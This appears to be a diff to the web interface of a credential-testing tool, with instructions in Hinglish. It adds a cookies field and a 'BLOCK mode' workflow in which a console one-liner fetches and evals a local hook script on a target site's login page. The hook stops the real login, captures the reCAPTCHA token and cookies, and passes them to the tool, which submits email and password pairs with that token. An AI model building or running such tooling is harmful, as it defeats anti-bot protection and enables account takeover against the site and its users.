@@ -142,14 +142,16 @@
         <label>reCAPTCHA Token (auto ya manual paste)</label>
         <textarea id="testCaptcha" class="token-box" placeholder="Token yahan aayega — ya browser hook se auto-fill"></textarea>
         <div class="token-hint"><span id="tokenCharCount">0 characters</span> — <span id="tokenAuto" style="color:#71717a">waiting for hook</span></div>
+        <label>Cookies (optional — DevTools → Network → login → Request Headers → cookie:)</label>
+        <textarea id="testCookies" class="token-box" style="min-height:50px;max-height:80px" placeholder="session=abc; __cf_bm=xyz (hook se bhi auto aayega)"></textarea>
         <details style="margin-bottom:12px;font-size:12px;color:#93c5fd;">
-          <summary style="cursor:pointer">Auto Token Capture (browser hook)</summary>
+          <summary style="cursor:pointer">Auto Token — BLOCK mode (fresh token)</summary>
           <ol style="margin:8px 0 0 16px;line-height:1.6;">
-            <li>Login page kholo (Chrome)</li>
-            <li>F12 → Console</li>
-            <li>Paste run karo: <code style="color:#fbbf24">fetch('http://localhost:8080/token-hook.js').then(r=>r.text()).then(eval)</code></li>
-            <li>Login submit karo → token yahan auto aayega</li>
-            <li>Turant <b>Test One</b> dabao</li>
+            <li>Login page → F12 → Console</li>
+            <li><code style="color:#fbbf24">fetch('http://localhost:8080/token-hook.js').then(r=>r.text()).then(eval)</code></li>
+            <li>Login submit → browser fail dikhega (OK!) → token auto aayega</li>
+            <li><b>5 sec</b> ke andar <b>Test One</b> — token browser ne use NAHI kiya</li>
+            <li>403 aaye to Cookie header paste karo upar wale box mein</li>
           </ol>
         </details>
         <button class="btn-test" onclick="testSingle()">Test One</button>
@@ -235,8 +237,9 @@
         if (data.token && data.token !== lastSeenToken) {
           lastSeenToken = data.token;
           document.getElementById('testCaptcha').value = data.token;
+          if (data.cookies) document.getElementById('testCookies').value = data.cookies;
           updateTokenLen();
-          el.textContent = 'auto-captured ' + data.age_sec + 's ago ✓';
+          el.textContent = 'BLOCKED + captured ' + data.age_sec + 's ago ✓';
           el.style.color = '#22c55e';
         } else if (data.token) {
           el.textContent = 'captured ' + data.age_sec + 's ago' + (data.age_sec > 120 ? ' (expire ho sakta hai!)' : '');
@@ -257,6 +260,7 @@
         email: document.getElementById('testEmail').value,
         password: document.getElementById('testPass').value,
         recaptcha_token: token,
+        cookies: document.getElementById('testCookies').value.trim(),
       };
       const res = await fetch('/api/test-single', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body) });
       const data = await res.json();
